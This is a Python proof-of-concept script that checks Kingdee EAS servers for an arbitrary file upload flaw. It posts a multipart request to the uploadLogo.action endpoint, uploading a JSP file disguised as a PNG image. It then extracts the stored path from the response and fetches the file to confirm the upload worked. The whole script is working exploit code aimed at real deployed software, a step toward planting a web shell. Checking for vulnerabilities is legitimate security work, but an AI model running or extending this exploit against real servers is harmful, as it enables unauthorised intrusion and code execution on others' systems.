#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()


def verify(target):
    burp0_url = target + "/plt_portal/setting/uploadLogo.action"
    burp0_headers = {"User-Agent": "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close", "X-Forwarded-For": "", "Content-Type": "multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62"}
    burp0_data = "--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"chooseLanguage_top\"; filename=\"chooseLanguage_top\"\r\n\r\nch\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"dataCenter\"; filename=\"dataCenter\"\r\n\r\nxx\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"insId\"; filename=\"insId\"\r\n\r\n\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"type\"; filename=\"type\"\r\n\r\ntop\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\"\r\nContent-Type: image/png\r\n\r\ntest\r\n--04844569c7ca7d21a3ca115dca477d62--"
    try:
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
        filename_re = re.compile('gp.uploadLogoSuccess\("nullLogo","(.*?)",""\)')
        filename = filename_re.search(r.text).group(1)
        url2 = "{}/portal/res/file/upload/{}".format(target, filename)
        burp0_headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36"}
        r2 = requests.get(url2,headers=burp0_headers2,verify=False)
        if r2.status_code == 200 and "test" in r2.text:
            return url2, r2.text
    except:
        print(sys.exc_info())
        pass

    return "", ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 kingdee-eas-uploadlogo-action-fileupload.py ",target)
    url, data = verify(target)
    if url != "":
        print("[+]漏洞存在，上传后的文件路径为：", url, "\n内容为：", data)
    else:
        print("[-]漏洞不存在")
